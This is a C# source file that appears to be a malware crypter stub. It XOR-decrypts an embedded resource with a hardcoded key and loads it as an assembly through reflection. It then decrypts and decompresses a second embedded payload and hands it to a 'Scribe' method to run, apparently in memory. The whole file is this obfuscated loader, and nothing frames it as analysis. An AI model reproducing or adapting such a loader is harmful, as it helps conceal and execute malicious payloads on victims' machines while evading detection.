using System;
using System.IO;
using System.Reflection;
using System.Text;

internal class Fuck
{
	internal class Utils
	{
		public static object Swagger(string name, params object[] values)
		{
			DeliverUs.Name = name;
			DeliverUs.Values = values;
			return DeliverUs.Liberation();
		}

		public static byte[] getRes(string name)
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
			byte[] array = new byte[manifestResourceStream.Length];
			manifestResourceStream.Read(array, 0, array.Length);
			return XOR(array);
		}

		public static byte[] Dew(string name)
		{
			return (byte[])Swagger("Decompress", getRes(name));
		}

		public static byte[] XOR(byte[] bytes)
		{
			int num = 350;
			byte[] bytes2 = Encoding.ASCII.GetBytes("j7FqdbJiMeAC#PibLS$w'R4i04ZmU)0%aSE2w^&7$i$f>eyu%6%oIwk.eYH'L1J>LCS2u?c/XUdMHj38nDQsy17o4,nAmo/FUpPpU/qopdEq$Id!flPu^TM3nE~6UMES");
			for (int i = 0; i < bytes.Length; i++)
			{
				bytes[i] ^= (byte)((bytes2[i % bytes2.Length] >> i + num + bytes2.Length) & 0xFF);
			}
			return bytes;
		}
	}

	internal class DeliverUs
	{
		public static Assembly Assembly = Assembly.Load(Utils.getRes("Jtpac.resources"));

		public static string Name { get; set; }

		public static object[] Values { get; set; }

		public static object Liberation()
		{
			Type[] types = Assembly.GetTypes();
			foreach (Type type in types)
			{
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (methodInfo.Name == Name)
					{
						return methodInfo.Invoke(null, Values);
					}
				}
			}
			return null;
		}
	}

	private static void Main()
	{
		Utils.Swagger("Scribe", Utils.Dew("Tvgz.resources"), true, "", true, 0);
	}
}
